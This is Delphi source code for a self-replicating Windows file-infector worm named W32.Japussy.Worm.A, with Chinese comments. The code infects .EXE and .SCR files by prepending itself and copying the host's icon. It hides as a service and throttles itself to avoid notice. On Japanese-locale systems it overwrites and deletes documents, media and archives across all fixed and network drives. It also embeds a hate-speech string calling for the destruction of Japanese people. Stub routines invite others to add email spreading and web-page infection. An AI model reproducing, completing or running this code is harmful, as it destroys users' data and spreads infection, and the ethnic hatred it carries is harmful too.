program Japussy;
uses
  Windows, SysUtils, Classes, Graphics, ShellAPI{, Registry};
const
  HeaderSize = 82432;                  //病毒体的大小
  IconOffset = $12EB8;                 //PE文件主图标的偏移量
  
  //在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同
  //查找2800000020的十六进制字符串可以找到主图标的偏移量
   
{
  HeaderSize = 38912;                  //Upx压缩过病毒体的大小
  IconOffset = $92BC;                  //Upx压缩过PE文件主图标的偏移量
  
  //Upx 1.24W 用法: upx -9 --8086 Japussy.exe
}
  IconSize   = $2E8;                   //PE文件主图标的大小--744字节
  IconTail   = IconOffset + IconSize;  //PE文件主图标的尾部
  ID         = $44444444;              //感染标记
  
  //垃圾码，以备写入
  Catchword = 'If a race need to be killed out, it must be Yamato. ' +
              'If a country need to be destroyed, it must be Japan! ' +
              '*** W32.Japussy.Worm.A ***';
{$R *.RES}
function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer; 
  stdcall; external 'Kernel32.dll'; //函数声明
var
  TmpFile: string;
  Si:      STARTUPINFO;
  Pi:      PROCESS_INFORMATION;
  IsJap:   Boolean = False; //日文操作系统标记
{ 判断是否为Win9x }
function IsWin9x: Boolean;
var
  Ver: TOSVersionInfo;
begin
  Result := False;
  Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if not GetVersionEx(Ver) then
    Exit;
  if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x
    Result := True;
end;
{ 在流之间复制 }
procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;
  dStartPos: Integer; Count: Integer);
var
  sCurPos, dCurPos: Integer;
begin
  sCurPos := Src.Position;
  dCurPos := Dst.Position;
  Src.Seek(sStartPos, 0);
  Dst.Seek(dStartPos, 0);
  Dst.CopyFrom(Src, Count);
  Src.Seek(sCurPos, 0);
  Dst.Seek(dCurPos, 0);
end;
{ 将宿主文件从已感染的PE文件中分离出来，以备使用 }
procedure ExtractFile(FileName: string);
var
  sStream, dStream: TFileStream;
begin
  try
    sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);
    try
      dStream := TFileStream.Create(FileName, fmCreate);
      try
        sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分
        dStream.CopyFrom(sStream, sStream.Size - HeaderSize);
      finally
        dStream.Free;
      end;
    finally
      sStream.Free;
    end;
  except
  end;
end;
{ 填充STARTUPINFO结构 }
procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);
begin
  Si.cb := SizeOf(Si);
  Si.lpReserved := nil;
  Si.lpDesktop := nil;
  Si.lpTitle := nil;
  Si.dwFlags := STARTF_USESHOWWINDOW;
  Si.wShowWindow := State;
  Si.cbReserved2 := 0;
  Si.lpReserved2 := nil;
end;
{ 发带毒邮件 }
procedure SendMail;
begin
  //哪位仁兄愿意完成之？
end;
{ 感染PE文件 }
procedure InfectOneFile(FileName: string);
var
  HdrStream, SrcStream: TFileStream;
  IcoStream, DstStream: TMemoryStream;
  iID: LongInt;
  aIcon: TIcon;
  Infected, IsPE: Boolean;
  i: Integer;
  Buf: array[0..1] of Char;
begin
  try //出错则文件正在被使用，退出
    if CompareText(FileName, 'JAPUSSY.EXE') = 0 then //是自己则不感染
      Exit;
    Infected := False;
    IsPE     := False;
    SrcStream := TFileStream.Create(FileName, fmOpenRead);
    try
      for i := 0 to $108 do //检查PE文件头
      begin
        SrcStream.Seek(i, soFromBeginning);
        SrcStream.Read(Buf, 2);
        if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记
        begin
          IsPE := True; //是PE文件
          Break;
        end;
      end;
      SrcStream.Seek(-4, soFromEnd); //检查感染标记
      SrcStream.Read(iID, 4);
      if (iID = ID) or (SrcStream.Size < 10240) then //太小的文件不感染
        Infected := True;
    finally
      SrcStream.Free;
    end;
    if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出
      Exit;
    IcoStream := TMemoryStream.Create;
    DstStream := TMemoryStream.Create;
    try
      aIcon := TIcon.Create;
      try
        //得到被感染文件的主图标(744字节)，存入流
        aIcon.ReleaseHandle;
        aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);
        aIcon.SaveToStream(IcoStream);
      finally
        aIcon.Free;
      end;
      SrcStream := TFileStream.Create(FileName, fmOpenRead);
      //头文件
      HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);
      try
        //写入病毒体主图标之前的数据
        CopyStream(HdrStream, 0, DstStream, 0, IconOffset);
        //写入目前程序的主图标
        CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);
        //写入病毒体主图标到病毒体尾部之间的数据
        CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);
        //写入宿主程序
        CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);
        //写入已感染的标记
        DstStream.Seek(0, 2);
        iID := $44444444;
        DstStream.Write(iID, 4);
      finally
        HdrStream.Free;
      end;
    finally
      SrcStream.Free;
      IcoStream.Free;
      DstStream.SaveToFile(FileName); //替换宿主文件
      DstStream.Free;
    end;
  except;
  end;
end;

{ 将目标文件写入垃圾码后删除 }
procedure SmashFile(FileName: string);
var
  FileHandle: Integer;
  i, Size, Mass, Max, Len: Integer;
begin
  try
    SetFileAttributes(PChar(FileName), 0); //去掉只读属性
    FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件
    try
      Size := GetFileSize(FileHandle, nil); //文件大小
      i := 0;
      Randomize;
      Max := Random(15); //写入垃圾码的随机次数
      if Max < 5 then
        Max := 5;
      Mass := Size div Max; //每个间隔块的大小
      Len := Length(Catchword);
      while i < Max do
      begin
        FileSeek(FileHandle, i * Mass, 0); //定位
        //写入垃圾码，将文件彻底破坏掉
        FileWrite(FileHandle, Catchword, Len);
        Inc(i);
      end;
    finally
      FileClose(FileHandle); //关闭文件
    end;
    DeleteFile(PChar(FileName)); //删除之
  except
  end;
end;
{ 获得可写的驱动器列表 }
function GetDrives: string;
var
  DiskType: Word;
  D: Char;
  Str: string;
  i: Integer;begin
  for i := 0 to 25 do //遍历26个字母
  begin
    D := Chr(i + 65);
    Str := D + ':';
    DiskType := GetDriveType(PChar(Str));
    //得到本地磁盘和网络盘
    if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then
      Result := Result + D;
  end;
end;
{ 遍历目录，感染和摧毁文件 }
procedure LoopFiles(Path, Mask: string);
var
  i, Count: Integer;
  Fn, Ext: string;
  SubDir: TStrings;
  SearchRec: TSearchRec;
  Msg: TMsg;
  function IsValidDir(SearchRec: TSearchRec): Integer;
  begin
    if (SearchRec.Attr <> 16) and  (SearchRec.Name <> '.') and
      (SearchRec.Name <> '..') then
      Result := 0 //不是目录
    else if (SearchRec.Attr = 16) and  (SearchRec.Name <> '.') and
      (SearchRec.Name <> '..') then
        Result := 1 //不是根目录
    else Result := 2; //是根目录
  end;
begin
  if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then
  begin
    repeat
      PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑
      if IsValidDir(SearchRec) = 0 then
      begin
        Fn := Path + SearchRec.Name;
        Ext := UpperCase(ExtractFileExt(Fn));
        if (Ext = '.EXE') or (Ext = '.SCR') then
        begin
          InfectOneFile(Fn); //感染可执行文件        
        end
        else if (Ext = '.HTM') or (Ext = '.HTML') or (Ext = '.ASP') then
        begin
          //感染HTML和ASP文件，将Base64编码后的病毒写入
          //感染浏览此网页的所有用户
          //哪位大兄弟愿意完成之？
        end
        else if Ext = '.WAB' then //Outlook地址簿文件
        begin
          //获取Outlook邮件地址
        end
        else if Ext = '.ADC' then //Foxmail地址自动完成文件
        begin
          //获取Foxmail邮件地址
        end
        else if Ext = 'IND' then //Foxmail地址簿文件
        begin
          //获取Foxmail邮件地址
        end
        else 
        begin
          if IsJap then //是倭文操作系统
          begin
            if (Ext = '.DOC') or (Ext = '.XLS') or (Ext = '.MDB') or
              (Ext = '.MP3') or (Ext = '.RM') or (Ext = '.RA') or
              (Ext = '.WMA') or (Ext = '.ZIP') or (Ext = '.RAR') or
              (Ext = '.MPEG') or (Ext = '.ASF') or (Ext = '.JPG') or
              (Ext = '.JPEG') or (Ext = '.GIF') or (Ext = '.SWF') or
              (Ext = '.PDF') or (Ext = '.CHM') or (Ext = '.AVI') then
                SmashFile(Fn); //摧毁文件
          end;
        end;
      end;
      //感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑
      Sleep(200);
    until (FindNext(SearchRec) <> 0);
  end;
  FindClose(SearchRec);
  SubDir := TStringList.Create;
  if (FindFirst(Path + '*.*', faDirectory, SearchRec) = 0) then
  begin
    repeat
      if IsValidDir(SearchRec) = 1 then
        SubDir.Add(SearchRec.Name);
    until (FindNext(SearchRec) <> 0);
    end;
  FindClose(SearchRec);
  Count := SubDir.Count - 1;
  for i := 0 to Count do
    LoopFiles(Path + SubDir.Strings[i] + '', Mask);
  FreeAndNil(SubDir);
end;
{ 遍历磁盘上所有的文件 }
procedure InfectFiles;

var
  DriverList: string;
  i, Len: Integer;
begin
  if GetACP = 932 then //日文操作系统
    IsJap := True; //去死吧！
  DriverList := GetDrives; //得到可写的磁盘列表
  Len := Length(DriverList);
  while True do //死循环
  begin
    for i := Len downto 1 do //遍历每个磁盘驱动器
      LoopFiles(DriverList[i] + ':', '*.*'); //感染之
    SendMail; //发带毒邮件
    Sleep(1000 * 60 * 5); //睡眠5分钟
  end;
end;
{ 主程序开始 }
begin
  if IsWin9x then //是Win9x
    RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程
  else //WinNT
  begin
    //远程线程映射到Explorer进程
    //哪位兄台愿意完成之？
  end;
  //如果是原始病毒体自己
  if CompareText(ExtractFileName(ParamStr(0)), 'Japussy.exe') = 0 then
    InfectFiles //感染和发邮件
  else //已寄生于宿主程序上了，开始工作
  begin
    TmpFile := ParamStr(0); //创建临时文件
    Delete(TmpFile, Length(TmpFile) - 4, 4);
    TmpFile := TmpFile + #32 + '.exe'; //真正的宿主文件，多一个空格
    ExtractFile(TmpFile); //分离之
    FillStartupInfo(Si, SW_SHOWDEFAULT);
    CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,
      0, nil, '.', Si, Pi); //创建新进程运行之
    InfectFiles; //感染和发邮件
  end;
end.